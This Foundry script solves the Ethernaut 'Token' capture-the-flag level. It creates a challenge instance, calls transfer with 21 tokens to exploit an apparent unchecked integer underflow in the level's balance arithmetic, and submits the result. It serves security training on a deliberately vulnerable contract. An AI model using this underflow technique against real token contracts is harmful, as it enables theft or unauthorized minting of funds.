// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract TokenSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x478f3476358Eb166Cb7adE4666d04fbdDB56C407;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        IToken token = IToken(challengeInstance);
        uint256 initialBalance = token.balanceOf(address(this));
        token.transfer(address(this), 21);
        uint256 balanceAfterTransfer = token.balanceOf(address(this));
        // console2.logUint("Initial balance", initialBalance);
        // console2.logUint("Balance after transfer", balanceAfterTransfer);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(5));
    }
}
